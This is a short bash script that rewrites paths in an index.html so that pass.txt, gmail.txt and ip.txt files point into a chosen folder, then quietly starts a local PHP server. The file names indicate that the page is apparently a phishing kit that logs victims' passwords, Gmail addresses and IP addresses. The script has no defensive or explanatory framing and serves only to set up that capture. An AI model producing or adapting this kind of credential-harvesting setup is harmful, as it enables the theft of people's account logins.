#!/bin/bash

# Check if a folder name is provided as an argument
if [ -z "$1" ]; then
  echo "Error: Folder name argument is missing."
  echo "Usage: $0 <folder_name>"
  exit 1
fi

# Assign the first argument to FOLDER_NAME
FOLDER_NAME="$1"

# Path to your index.html
HTML_FILE="index.html"

# Check if the index.html exists
if [ ! -f "$HTML_FILE" ]; then
  echo "Error: $HTML_FILE not found."
  exit 1
fi

# Use awk to replace any placeholder (like /FILENAME/) with the custom folder name
awk -v folder="$FOLDER_NAME" '
{
  gsub(/\/[^\/]+\/pass\.txt\?nocache=\${randomString}/, "/" folder "/pass.txt?nocache=${randomString}");
  gsub(/\/[^\/]+\/gmail\.txt\?nocache=\${randomString}/, "/" folder "/gmail.txt?nocache=${randomString}");
  gsub(/\/[^\/]+\/ip\.txt\?nocache=\${randomString}/, "/" folder "/ip.txt?nocache=${randomString}");
  print $0;
}
' "$HTML_FILE" > temp.html

# Replace the original file with the updated version
mv temp.html "$HTML_FILE"

php -S localhost:8023 > /dev/null 2>&1 &
